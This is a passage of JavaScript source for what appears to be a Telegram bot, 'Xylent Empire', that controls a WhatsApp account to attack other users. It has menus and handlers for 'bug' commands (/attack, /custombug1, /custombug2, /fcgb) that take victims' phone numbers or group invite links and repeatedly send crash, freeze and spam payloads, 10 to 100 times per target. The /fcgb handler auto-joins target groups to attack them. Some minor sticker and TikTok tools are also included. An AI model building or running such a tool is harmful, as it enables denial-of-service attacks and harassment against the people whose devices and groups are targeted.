┃❏ /addpromo 
┃❏ /delpromo
┃❏ /antipromo on/off
┃❏ /listpromo 
┃❏ /privatemute on/off
╰━───────────────━❏\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown" // Diubah ke Markdown agar format blok kode aktif
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("tools_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━───━⊱ ⊱⪩ 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /brat <Brat to sticker>
┃❏ /tiktokdl <TikTok downloader>
┃❏ /iqc <iPhone camera effect.>
┃❏ /info <cekid.>
╰━─────────────────━❏
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown" // Diubah ke Markdown agar format blok kode aktif
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("all_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `
<blockquote><strong>
╔═══〔 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 〕═══⎔
║
║  📢  𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗣𝗗𝗔𝗧𝗘
║
║  Silahkan ketik perintah:
║  ➥ <code>/updatesc</code>
║  ➥ <code>/autoupdate (on/off)</code>
║  ➥ <code>/checkupdate</code>
║  ➥ <code>/updatestatus</code>
║
║  Proses pembaruan script
║  akan berjalan otomatis.
║
╚═════════════════════⎔</strong></blockquote>`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML" // Diubah ke Markdown agar format blok kode aktif
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━━━〔 ALL FITURE • BEBAS SPAM • ANTI KENON 〕━━━╮
📱 ANDROID • INVISIBLE DELAY HARD
│ /xspam      ➜ 628xxxx 
│ /xspam1    ➜ 628xxxx 
│ /xspam2     ➜ 628xxxx 
│ /xspam3     ➜ 628xxxx 
│ /xspam4     ➜ 628xxxx 
│ /combo1     ➜ 628xxxx 
│ /combo     ➜ 628xxxx 

📱 ANDROID • FORCLOSE X BLANK
│ /stcblank     ➜ 628xxxx   
│ /uisystem    ➜ 628xxxx  
│ /blankui    ➜ 628xxxx   
│ /fcclick    ➜ 628xxxx

🍏 IOS • FORECLOSE INVISIBLE ✦
│ /iosattack     ➜ 628xxxx 

☣️ SPESIAL BUG ✦
│ /custombug1     ➜ 628xxxx 
│ /custombug2 ➜ 628xxxx 
│ /attack ➜ 628xxxx 
━━━━━━━━━━━━━━━━━━━━━━

👥 BUGS GROUP • DELAY X FC CLICK
│ /fcgb       ➜ link group 
│ /delaygb    ➜ link group 
┊
┊  ⚠️ EFFECT FC GROUP :
┊  ➜ Fc Group  Click
┊  ➜ All Member Delay
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
💡 Tips:
│ /blockcmd /command     → menghidupkan command
│ /unblockcmd /command  → mematikan command
│ /listblockcmd              → cek status command
│ ACTIVE / OFFLINE  
╰━━━━━━━━━━━━━━━━━━━━━━╯
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  // KOREKSI: Hapus properti 'style' karena tidak didukung Telegram
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: "primary" }, // callback_data sesuaikan dengan menu utama botmu
        { text: "➡️ ", callback_data: "bug_menu2", style: "success" }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

bot.action("bug_menu2", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━━━〔 BUGS VERSI 2 〕━━━╮
📱 ANDROID • DELAY X FREEZE
│ /lockchat     ➜ 628xxxx   
│ /delayvisible    ➜ 628xxxx  
╰━━━━━━━━━━━━━━━━━━━━━
╭━━━━━━━━━━━━━━━━━━━━━━━━
│ /fcgb         ➜ link group
│ /delaygb      ➜ linkgroup
│ /testfunc     ➜ 628xxxx 50
│ /testgb ➜ link group 50
┊  ⚠️ EFFECT FC GROUP :
┊  ➜ Fc Group  Click
┊  ➜ All Member Delay
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  // KOREKSI: Hapus properti 'style' & ubah callback_data ke 'bug_menu' agar kembali ke halaman 1
  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "bug_menu", style: "primary" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});


// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waktu = getRealTime(); // Menambahkan variabel waktu yang kurang
  const waStatus = sock && sock.user ? "✔️" : "❌ ";
      
  const mainMenuMessage = `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   システムオンライン — アクセス許可済み
   >> 開発責任者 — @xyzenofficial <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐎𝐆 〕───╮
│ ◈ DEV   : @xyzenofficial
│ ◈ SCRIPT   : Xylent Empire
│ ◈ USER  : ${Name}
│ ◈ TIME  : ${waktuRunPanel}
│ ◈ DATE  : ${waktu}
│ ◈ STATUS : ${waStatus}
╰──────────────────────╯
\`\`\``;

 const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown" // Diubah ke Markdown agar format blok kode aktif
  };

  const mainKeyboard = [
    [
    {
        text: "「 👤 」𝐎͢𝐖͡𝐍͜𝐄͢𝐑͡⃟🞇𝐌͜𝐄͢𝐍͡𝐔͜⃟🞇",
        callback_data: "owner_menu",
        style: 'success',
      },
      {
        text: "「 🚀 」 𝐀͢𝐔͡𝐓͜⃟🞇𝐎͢ 𝐔͡𝐏͜𝐃͢𝐀͡𝐓͜⃟🞇𝐄͢",
        callback_data: "all_menu",
        style: 'danger',
      },
      {
        text: "「 🍂 」 𝐁͢𝐮͡𝐠͜⃟🞇𝐌͢e͡𝐧͜𝐮⃟🞇",
        callback_data: "bug_menu",
        style: 'primary',
      }
    ],
    [
    {
        text: "「 🎊 」 𝐅͢𝐈͡𝐓͜𝐔͢𝐑͡𝐄͜⃟🞇𝐓͢𝐎͡𝐎͜𝐋͢𝐒͡⃟🞇𝐌͢𝐄͡𝐍͜𝐔⃟🞇",
        callback_data: "tools_menu",
        style: 'danger',
      }
      ],
      [
      {
        text: "「 🪷 」 𝐈͢𝐍͡𝐅͜𝐎͢𝐑͡𝐌͜𝐀͢𝐒͡𝐈͜⃟🞇𝐒͢𝐂͡𝐑͜𝐈͢𝐏͡𝐓͜⃟🞇",
        url: "https://t.me/XylentOfficial",
        style: 'danger',
      },
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

// CUSTOMBUG 3
// ===== COMMAND =====
bot.command("custombug2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /custombug2 62xxx,62xxx");

  const numbers = q.split(",")
    .map(v => v.replace(/[^0-9]/g, ''))
    .filter(v => v.length > 5);

  if (!numbers.length) return ctx.reply("❌ Nomor tidak valid");

  const targets = numbers.map(v => `${v}@s.whatsapp.net`);

  multiBugSession.set(ctx.from.id, {
    targets,
    numbers,
    selected: []
  });

  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `⚡ *MULTI BUG PANEL*\n\n🎯 Target (${numbers.length}):\n${numbers.map(v => `• ${v}`).join("\n")}\n\nPilih bug lalu tekan EXECUTE`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  });
});

// ===== BUTTON =====
function buildButtons(userId) {
  const s = multiBugSession.get(userId);
  const isOn = (b) => s.selected.includes(b) ? "⭐" : "💎";

  const btn = (b, name) => ({
    text: `${isOn(b)} ${name}`,
    callback_data: `cb3bug|${b}` // 🔥 prefix unik
  });

  return [
    [btn("bulldo","BULLDO"), btn("delayfreeze","DELAY FREEZE"), btn("harddelay","DELAY HARD")],
    [btn("bebasspam","BEBAS SPAM"), btn("stcb","STCBLANK"),
    btn("fcclick","FC CLICK")],
    [
      { text: "🚀 EXECUTE", callback_data: "cb3bug|exec" }
    ]
  ];
}

// ===== UPDATE =====
async function updateMulti(ctx) {
  await ctx.telegram.editMessageReplyMarkup(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  );
}

// ===== REGEX (ANTI TABRAKAN) =====
bot.action(/^cb3bug\|([^|]+)$/, async (ctx) => {
  const key = ctx.match[1];
  const s = multiBugSession.get(ctx.from.id);

  if (!s) return ctx.answerCbQuery("Session expired");

  // ===== EXECUTE =====
  if (key === "exec") {

    if (!s.selected.length) {
      return ctx.answerCbQuery("❌ Pilih bug!", { show_alert: true });
    }

    await ctx.answerCbQuery("🚀 EXECUTING...");

    try {

      for (const target of s.targets) {
        for (const bug of s.selected) {

          if (bug === "bulldo") {
            for (let i=0;i<100;i++){ await dingleyhard(sock, target, ptcp = true); await sleep(1500); }
          }
          else if (bug === "delayfreeze") {
            for (let i=0;i<100;i++){ await CrmXcarousel(sock, target); await sleep(1500); }
          }
          else if (bug === "harddelay") {
            for (let i=0;i<100;i++){ await MBGCOMBO(sock, target); await sleep(1500); }
          }
          else if (bug === "bebasspam") {
            for (let i=0;i<100;i++){ await delaycrashV4(sock, target); await sleep(1500); }
          }
          else if (bug === "stcb") {
            for (let i=0;i<50;i++){ await stickerUi(sock, target); await sleep(1000); }
          }
          else if (bug === "fcclick") {
            for (let i=0;i<10;i++){ await X7Klik(sock, target); await sleep(1000); }
          }
        }
        await sleep(1500);
      }

      await ctx.reply(`✅ DONE\nTarget: ${s.targets.length}\nBug: ${s.selected.join(", ")}`);

    } catch (err) {
      console.error(err);
      await ctx.reply("❌ Error saat eksekusi");
    }

    return;
  }

  // ===== TOGGLE =====
  const i = s.selected.indexOf(key);

  if (i > -1) s.selected.splice(i, 1);
  else s.selected.push(key);

  await updateMulti(ctx);
  await ctx.answerCbQuery(`${key.toUpperCase()} ${i > -1 ? "OFF" : "ON"} ⭐`);
});
// CUSTOMBUG 2
// ===== PAGE DATA (UPGRADE JADI 5 PAGE) =====
const togglePages = {
  1: ["bulldo", "delayfreeze", "harddelay"],
  2: ["bebasspam", "stcb", "fcclick"]
};

bot.command("custombug1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];
  if (!q) return ctx.reply("Example: /custombug1 62xxx");

  const cleanNumber = q.replace(/[^0-9]/g, '');
  const finalNumber = `${cleanNumber}@s.whatsapp.net`;

  attackConfig.set(ctx.from.id, {
    target: finalNumber,
    number: cleanNumber,
    page: 1,

    bulldo: false,
    delayfreeze: false,
    harddelay: false,
    bebasspam: false,
    stcb: false
  });

  const s = attackConfig.get(ctx.from.id);

  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: formatPanel(s),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: buildMenu(s)
    }
  });
});

// ===== FORMAT =====
function formatPanel(s) {
  const icon = (v) => v ? "⭐" : "💎";

  return `⚡ *ATTACK CONTROL PANEL* ⚡\n\n` +
         `📄 Page : ${s.page}/2\n\n` +

         `🔥 STATUS\n` +
         `• BULLDOZER       : ${icon(s.bulldo)}\n` +
         `• DELAY            : ${icon(s.delayfreeze)}\n` +
         `• DELAY HARD     : ${icon(s.harddelay)}\n` +
         `• BEBAS SPAM     : ${icon(s.bebasspam)}\n` +
         `• STIKER BLANK   : ${icon(s.stcb)}\n`;
         `• FC CLICK         : ${icon(s.fcclick)}\n`;
}

// ===== BUTTON =====
function buildMenu(s) {
  const btn = (key) => ({
    text: `${s[key] ? "⭐" : "💎"} ${key.toUpperCase()}`,
    callback_data: `toggle_${key}`
  });

  const current = togglePages[s.page];
  const keyboard = [];

  for (let i = 0; i < current.length; i += 2) {
    const row = [];
    row.push(btn(current[i]));
    if (current[i + 1]) row.push(btn(current[i + 1]));
    keyboard.push(row);
  }

  keyboard.push([
    { text: "⬅️", callback_data: `custombug1_page_${s.page - 1}:${s.target}` },
    { text: `📄 ${s.page}/2`, callback_data: "noop" },
    { text: "➡️", callback_data: `custombug1_page_${s.page + 1}:${s.target}` }
  ]);

  keyboard.push([
    { text: "🚀 EXECUTE", callback_data: `custombug1_exec:${s.target}` }
  ]);

  return keyboard;
}

// ===== UPDATE =====
async function update(ctx, s) {
  await ctx.telegram.editMessageCaption(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    formatPanel(s),
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: buildMenu(s)
      }
    }
  );
}

// ===== TOGGLE =====
bot.action(/^toggle_(.+)$/, async (ctx) => {
  const key = ctx.match[1];
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  if (!(key in s)) return ctx.answerCbQuery("Invalid");

  s[key] = !s[key];

  await update(ctx, s);
  await ctx.answerCbQuery(`${key.toUpperCase()} ${s[key] ? "ON ⭐" : "OFF"}`);
});

// ===== SLIDE =====
bot.action(/^custombug1_page_(\d+):(.+)$/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  if (page < 1 || page > 2) return ctx.answerCbQuery();

  s.page = page;

  await update(ctx, s);
  await ctx.answerCbQuery(`Page ${page}`);
});

// ===== EXECUTE =====
bot.action(/^custombug1_exec:(.+)$/, async (ctx) => {
  const target = ctx.match[1];
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  await ctx.answerCbQuery("🚀 EXECUTING...");

  try {

    if (s.bulldo) for (let i=0;i<100;i++){ await dingleyhard(sock, target, ptcp = true); await sleep(1500);}
    if (s.delayfreeze) for (let i=0;i<100;i++){ await CrmXcarousel(sock, target); await sleep(1500);}
    if (s.harddelay) for (let i=0;i<100;i++){ await MBGCOMBO(sock, target); await sleep(1500);}
    if (s.bebasspam) for (let i=0;i<100;i++){ await delaycrashV4(sock, target); await sleep(1500);}
    if (s.stcb) for (let i=0;i<50;i++){ await stickerUi(sock, target); await sleep(1000);}
    if (s.fcclick) for (let i=0;i<10;i++){ await X7Klik(sock, target); await sleep(1000);}
    
    await ctx.reply(`✅ ATTACK FINISHED`);

  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Error saat eksekusi");
  }
});
//////// -- CASE BUG SELECT BUTTON BUG --- \\\\\\\\\\\
let lastTarget = {}; // simpen nomor biar kebaca di action

bot.command("attack", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {

  const chatId = ctx.chat.id;
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

  const args = ctx.message.text.split(" "); // 🔥 FIX
  const q = args[1];
  if (!q) return ctx.reply("Example: /attack 62xxx");

  const cleanNumber = args[1].replace(/[^0-9]/g, '');
  const finalNumber = `${cleanNumber}@s.whatsapp.net`;

  lastTarget[ctx.from.id] = cleanNumber; // 🔥 simpen

  const waStatus = sock && sock.user
    ? "On Boss"
    : "Ga On Jir"; 

  const caption = `
「𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄」
⫹⫺ - ${cleanNumber}
⫹⫺ - Date : ${new Date().toLocaleDateString()}
⫹⫺ - Status Sender : ${waStatus}
⫹⫺ - 𝗦𝗘𝗟𝗘𝗖𝗧 𝗧𝗛𝗘 𝗕𝗨𝗧𝗢𝗡 𝗕𝗨𝗚
`;

  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗕𝗨𝗟𝗟𝗗𝗢𝗭𝗘𝗥 👻", callback_data: `attack_bulldo:${finalNumber}` },
          { text: "𝗗𝗘𝗟𝗔𝗬 𝗙𝗥𝗘𝗘𝗭𝗘 🧬", callback_data: `attack_delayfreeze:${finalNumber}` }
        ],
        [
          { text: "𝗗𝗘𝗟𝗔𝗬 𝗛𝗔𝗥𝗗 📱", callback_data: `attack_harddelay:${finalNumber}` }
        ],
        [
          { text: "𝗕𝗟𝗔𝗡𝗞 🔥", callback_data: `attack_stcb:${finalNumber}` }, 
          { text: "𝗙𝗖 𝗖𝗟𝗜𝗖𝗞 🔥", callback_data: `attack_fcclick:${finalNumber}` }
        ]
      ]
    }
  };

  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption,
    ...keyboard,
  });
});

bot.action(/^attack_(\w+):(.+)$/, checkPremium, async (ctx) => {
  const bugType = ctx.match[1];
  const target = ctx.match[2];
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
  const cleanNumber = lastTarget[ctx.from.id] || target; // Fallback ke target jika lastTarget kosong

  await ctx.answerCbQuery();

  try {
    // Memastikan sock tersedia (ganti dengan cara kamu mendefinisikan sock jika berbeda)
    // if (!sock) return ctx.reply("❌ Koneksi bot WhatsApp tidak aktif.");

    switch (bugType) {
      case "stcb":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 60; i++) {
          await stickerUi(sock, target);
          await sleep(1000);
        }
        break;
        
      case "fcclick":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 10; i++) {
          await X7Klik(sock, target);
          await sleep(1000);
        }
        break;

      case "harddelay":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await MBGCOMBO(sock, target);
          await sleep(1500);
        }
        break;

      case "bulldo":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await dingleyhard(sock, target, true); // Perbaikan penulisan parameter default ptcp
          await sleep(1000);
        }
        break;

      case "delayfreeze":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await CrmXcarousel(sock, target);
          await sleep(1000);
        }
        break;

      default:
        return ctx.reply("❌ Bug tidak ditemukan.");
    }

    // Menambahkan parse_mode: "HTML" agar tag blockquote aktif
    await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
      caption:  `\`\`\`💤 MODE : Spesial Bug

🤍 User   : ${username}
🎯 Target : ${cleanNumber}
Type   : Status
🚀 Result : SPAM COMPLETE\`\`\``, 
      reply_markup: {
        inline_keyboard: [
          [
            { text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://wa.me/${cleanNumber}`, style: "danger" }
          ]
        ]
      }
    });

  } catch (err) {
    console.error(err);
    await ctx.reply("Error terjadi, silakan cek konsol/panel.");
  }
});

//////// -- CASE TOOLS --- \\\\\\\\\\\
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

const formatUserInfo = (user, chat) => {
  const lines = [
    `👤 *Info User*`,
    ``,
    `🆔 *User ID:* \`${user.id}\``,
    `👤 *Nama:* ${user.first_name}${user.last_name ? " " + user.last_name : ""}`,
    `🔖 *Username:* ${user.username ? "@" + user.username : "_(tidak ada)_"}`,
    `🤖 *Bot:* ${user.is_bot ? "Ya" : "Tidak"}`,
    `🌐 *Bahasa:* ${user.language_code || "_(tidak diketahui)_"}`,
    ``,
    `💬 *Info Chat*`,
    ``,
    `🆔 *Chat ID:* \`${chat.id}\``,
    `📌 *Tipe Chat:* ${chat.type}`,
  ];

  if (chat.title) lines.push(`📛 *Judul Grup:* ${chat.title}`);
  if (chat.username) lines.push(`🔖 *Username Grup:* @${chat.username}`);

  return lines.join("\n");
};

bot.command("info", (ctx) => {
  ctx.replyWithMarkdown(formatUserInfo(ctx.from, ctx.chat));
});


bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|SennJmbud",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
//////// -- CASE BUG GROUP --- \\\\\\\\\\\
bot.command("fcgb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const text = ctx.message.text || "";
  
  // Regex super aman untuk mengambil kode undangan WhatsApp Group
  const inviteCodeMatch = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,26})/);
  
  if (!inviteCodeMatch) {
    return ctx.reply(`❌ Format link salah!\nExample: /fcgb https://chat.whatsapp.com/InviteCodeGrupNya`);
  }

  const inviteCode = inviteCodeMatch[1]; // Ini kode bersihnya (tanpa spasi / parameter sisa)
  let target = null;

  try {
    // LANGKAH 1: Cek internal cache bot dulu (apakah bot sudah di dalam grup?)
    try {
      const chats = await sock.groupFetchAllParticipating();
      const groups = Object.values(chats);
      
      // Cari yang metadata inviteCode-nya sama, atau id grup-nya sama (jika ada)
      const matchingGroup = groups.find(g => g.inviteCode === inviteCode || g.id?.includes(inviteCode));
      if (matchingGroup) {
        target = matchingGroup.id;
      }
    } catch (cacheError) {
      console.log("Gagal fetch internal cache, lanjut metode langsung...");
    }

    // LANGKAH 2: Jika JID belum ketemu dari cache, pakai groupGetInviteInfo / groupAcceptInvite
    if (!target) {
      try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
        target = groupInfo.id;
        
        // Langsung auto join
        await sock.groupAcceptInvite(inviteCode);
      } catch (inviteError) {
        // Handle kondisi unik: Baileys sering return error 409 (conflict) kalau bot SEBENARNYA SUDAH JOIN
        if (inviteError.status === 409 || String(inviteError).includes("conflict")) {
          // Jika error karena sudah join, coba tebak atau ekstrak JID dari object error
          target = inviteError.context?.jid || inviteError.jid;
        }
        
        // Jika masih tidak ketemu target JID-nya, coba paksa join langsung tanpa GetInfo
        if (!target) {
          try {
            target = await sock.groupAcceptInvite(inviteCode);
          } catch (forceJoinError) {
            // Jika force join juga mengembalikan info JID (di beberapa versi Baileys)
            if (forceJoinError.context?.jid) target = forceJoinError.context.jid;
          }
        }
      }
    }

    // PENGAMAN TERAKHIR: Jika semua cara di atas gagal mendapatkan JID (@g.us)
    if (!target) {
      return ctx.reply("❌ Gagal mendapatkan ID Grup. Pastikan bot belum di-banned atau link undangan masih aktif!");
    }

  } catch (globalError) {
    console.error("Error Group Join:", globalError);
    return ctx.reply("❌ Terjadi kesalahan sistem saat memproses grup.");
  }

  // --- JIKA JID BERHASIL DIDAPATKAN, PROSES SPAM SEPERTI BIASA ---
  const username = ctx.from.username
    ? `@${ctx.from.username}`
